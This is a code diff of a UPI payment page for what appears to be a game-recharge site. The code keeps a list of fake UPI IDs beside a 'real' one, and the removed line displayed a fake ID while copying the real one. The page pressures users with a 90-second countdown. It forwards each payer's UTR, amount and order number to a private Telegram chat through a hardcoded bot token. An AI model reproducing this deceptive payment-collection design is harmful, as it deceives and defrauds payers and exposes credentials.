@@ -62,8 +62,9 @@
             border: 1px solid #3498db !important; padding: 5px 10px; border-radius: 5px;
         }
         /* --- UPDATED: QR Code Style --- */
-        #qrCodeImage {
+        #qrCodeCanvas {
             display: block; margin: 15px auto; height: 200px; width: 200px;
+            border: 1px solid #ddd; border-radius: 8px; padding: 10px;
         }
 		#session-timer-container {
             text-align: center; padding: 10px; color: #d93026;
@@ -97,6 +98,18 @@
         .success-checkmark__circle { stroke-dasharray: 166; stroke-dashoffset: 166; stroke-width: 2; stroke-miterlimit: 10; stroke: #28a745; fill: none; animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards; }
         .success-checkmark__check { transform-origin: 50% 50%; stroke-dasharray: 48; stroke-dashoffset: 48; animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards; }
         @keyframes stroke { 100% { stroke-dashoffset: 0; } }
+        
+        /* UPI ID Display */
+        .upi-display {
+            display: flex; justify-content: space-between; align-items: center; 
+            border: 1px solid #BDBDBD; padding: 12px; border-radius: 6px; 
+            margin-top: 15px; background: #f9f9f9;
+        }
+        .upi-text {
+            color: #333; font-weight: 500; margin: 0 !important; 
+            letter-spacing: 1px; flex-grow: 1; white-space: nowrap; 
+            overflow: hidden; text-overflow: ellipsis; font-size: 16px;
+        }
 	</style>
 </head>
 <body>
@@ -120,15 +133,15 @@
 			</div>
 			<div class="weui-panel__bd">
 				<div class="weui-media-box weui-media-box_text" style="padding:15px">
-                    <canvas id="qrCodeCanvas" style="display: block; margin: 15px auto; height: 200px; width: 200px;"></canvas>
+                    <canvas id="qrCodeCanvas"></canvas>
                     <div id="session-timer-container">
                         Session expires in: <span id="session-timer">01:30</span>
                     </div>
 					<div style="text-align:center; margin-top:15px; margin-bottom: 15px;">
 						<button class="download-btn-medium" id="downloadQR">Download QR</button>
 					</div>
-					<div style="display:flex; justify-content:space-between; align-items:center; border:1px solid #BDBDBD; padding:8px; border-radius:6px; margin-top:15px;">
-						<span id="upi" style="color:#333; font-weight:500; margin:0 !important; letter-spacing:1px; flex-grow: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;"></span>
+					<div class="upi-display">
+						<span id="upi" class="upi-text"></span>
 						<a class="weui-btn weui-btn_mini btn-transparent-border" href="javascript:" id="btncopy">Copy</a>
 					</div>
 				</div>
@@ -141,7 +154,7 @@
 			</div>
             <div class="weui-pay-input" id="refout">
                 <span class="utr-label">UTR:</span>
-                <input class="weui-pay-inputs" id="refno" placeholder="12-digit UTR/Reference ID" maxlength="12" type="text" pattern="\d*">
+                <input class="weui-pay-inputs" id="refno" placeholder="12-digit UTR/Reference ID" maxlength="12" type="text" pattern="\d*" inputmode="numeric">
             </div>
 		</div>
 
@@ -199,11 +212,14 @@
         const REAL_UPI = 'zero-2-hero-game.ta@axisbank';
 
 		// Function to generate dynamic QR code
-		function generateQRCode(amount, coupon) {
-			const paymentUrl = `https://js-pay.vercel.app/api/create-order?amount=${amount}&remark=${coupon}`;
+		function generateQRCode(amount, remark) {
+			const paymentUrl = `https://js-pay.vercel.app/api/create-order.html?amount=${amount}&remark=${remark}`;
+			
+			console.log('Generating QR for URL:', paymentUrl);
 			
 			// Generate QR Code
-			QRCode.toCanvas(document.getElementById('qrCodeCanvas'), paymentUrl, {
+			const canvas = document.getElementById('qrCodeCanvas');
+			QRCode.toCanvas(canvas, paymentUrl, {
 				width: 200,
 				height: 200,
 				margin: 1,
@@ -212,8 +228,13 @@
 					light: '#FFFFFF'
 				}
 			}, function(error) {
-				if (error) console.error(error);
-				console.log('QR Code generated successfully!');
+				if (error) {
+					console.error('QR Code generation error:', error);
+					// Fallback if QR generation fails
+					canvas.getContext('2d').fillText('QR Code Failed', 10, 100);
+				} else {
+					console.log('QR Code generated successfully!');
+				}
 			});
 			
 			return paymentUrl;
@@ -224,7 +245,7 @@
 			const params = new URLSearchParams(window.location.search);
 			return {
 				amount: params.get('amount') || '100.00',
-				coupon: params.get('coupon') || 'RechargeTest'
+				remark: params.get('remark') || 'RechargeTest'
 			};
 		}
 
@@ -232,46 +253,73 @@
 			// Get parameters from URL
 			const urlParams = getUrlParams();
 			const amount = parseFloat(urlParams.amount).toFixed(2);
-			const coupon = urlParams.coupon;
+			const remark = urlParams.remark;
+			
+			console.log('URL Parameters:', {amount, remark});
 			
 			// Update amount display
 			$('#amountDisplay').text(amount);
 			
 			// Generate dynamic QR code
-			const paymentUrl = generateQRCode(amount, coupon);
+			const paymentUrl = generateQRCode(amount, remark);
 			
             const orderNumber = 'RS' + Date.now();
             const randomFakeUpi = fakeUpiList[Math.floor(Math.random() * fakeUpiList.length)];
-            $('#upi').text(randomFakeUpi);
+            $('#upi').text(REAL_UPI); // Show real UPI ID
 
 			startPageTimer(90, $('#session-timer'));
 			$("#savebtn").prop('disabled', true);
 
-			new ClipboardJS("#btncopy", { text: () => REAL_UPI })
-				.on("success", () => layer.msg("UPI copied successfully"))
-				.on("error", () => layer.msg("UPI copy failed"));
+			// Initialize clipboard for UPI copy
+			new ClipboardJS("#btncopy", { 
+				text: () => REAL_UPI 
+			}).on("success", function(e) {
+				layer.msg("UPI ID copied successfully!");
+				e.clearSelection();
+			}).on("error", function() {
+				layer.msg("Failed to copy UPI ID");
+			});
 
+			// UTR input validation - numbers only
 			$('#refno').on('input', function() {
+				// Remove any non-numeric characters
 				this.value = this.value.replace(/[^0-9]/g, '');
+				// Enable button only if exactly 12 digits
 				$("#savebtn").prop('disabled', this.value.length !== 12);
 			});
 
+			// Prevent paste of non-numeric characters
+			$('#refno').on('paste', function(e) {
+				const pasteData = e.originalEvent.clipboardData.getData('text');
+				if (!/^\d+$/.test(pasteData)) {
+					e.preventDefault();
+					layer.msg("Only numbers are allowed in UTR field");
+				}
+			});
+
+			// Submit button click handler
 			$("#savebtn").on("click", function() {
 				const refNo = $("#refno").val();
-				if (refNo.length !== 12) return;
+				if (refNo.length !== 12) {
+					layer.msg("Please enter exactly 12-digit UTR number");
+					return;
+				}
                 
                 layer.confirm(`Please confirm your submission:<br><br>
                                 Order No: <strong style="color:#333;">${orderNumber}</strong><br>
                                 UTR: <strong style="color:#0000FF; font-size:16px;">${refNo}</strong><br>
                                 Amount: <strong style="color:#e71111;">₹${amount}</strong><br>
-                                Coupon: <strong style="color:#333;">${coupon}</strong>`, {
-                    title: 'Confirm Submission',
+                                Remark: <strong style="color:#333;">${remark}</strong>`, {
+                    title: 'Confirm UTR Submission',
                     btn: ['Confirm', 'Cancel'],
-                    skin: 'layui-layer-molv'
+                    skin: 'layui-layer-molv',
+                    area: ['400px', 'auto']
                 }, function(index){
                     layer.close(index);
-                    sendToTelegram(refNo, orderNumber, amount, coupon);
+                    sendToTelegram(refNo, orderNumber, amount, remark);
                     showWaitingScreen(orderNumber);
+                }, function(index){
+                    layer.close(index);
                 });
 			});
 
@@ -279,14 +327,22 @@
 			$('#downloadQR').on('click', function() {
 				const canvas = document.getElementById('qrCodeCanvas');
 				const link = document.createElement('a');
-				link.download = `UPI_QR_${amount}_${coupon}.png`;
+				link.download = `UPI_QR_${amount}_${remark}.png`;
 				link.href = canvas.toDataURL('image/png');
 				link.click();
+				layer.msg("QR Code downloaded!");
 			});
 
-            layer.alert("After successful payment, you must return to this page and submit the 12-digit UTR/Reference ID to complete your transaction.", {
-                title: "Important Notice", icon: 0, btn: ["OK"]
-            });
+            // Show alert dialog on page load
+            setTimeout(function() {
+                layer.alert("After successful payment, you must return to this page and submit the 12-digit UTR/Reference ID to complete your transaction.", {
+                    title: "Important Notice", 
+                    icon: 0, 
+                    btn: ["OK"],
+                    skin: 'layui-layer-molv',
+                    area: ['400px', 'auto']
+                });
+            }, 500);
 		});
 
         function startPageTimer(duration, display) {
@@ -297,17 +353,19 @@
                 display.text(minutes + ":" + seconds);
                 if (--timer < 0) {
                     clearInterval(interval);
-                    location.reload(); 
+                    layer.msg("Session expired! Page will reload.", {icon: 2}, function(){
+                        location.reload(); 
+                    });
                 }
             }, 1000);
         }
 
-        function sendToTelegram(utr, orderId, amount, coupon) {
+        function sendToTelegram(utr, orderId, amount, remark) {
             const botToken = '8001601584:AAH9-edJlgkfdcPUBLVLZmqdEns2g_SRa_A';
             const chatId = '6879212044';
 
             const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-            const message = `🔔 New UTR Submission!\n\nOrder No: ${orderId}\nUTR: ${utr}\nAmount: ₹${amount}\nCoupon: ${coupon}\nTimestamp: ${timestamp}`;
+            const message = `🔔 New UTR Submission!\n\nOrder No: ${orderId}\nUTR: ${utr}\nAmount: ₹${amount}\nRemark: ${remark}\nTimestamp: ${timestamp}`;
             
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
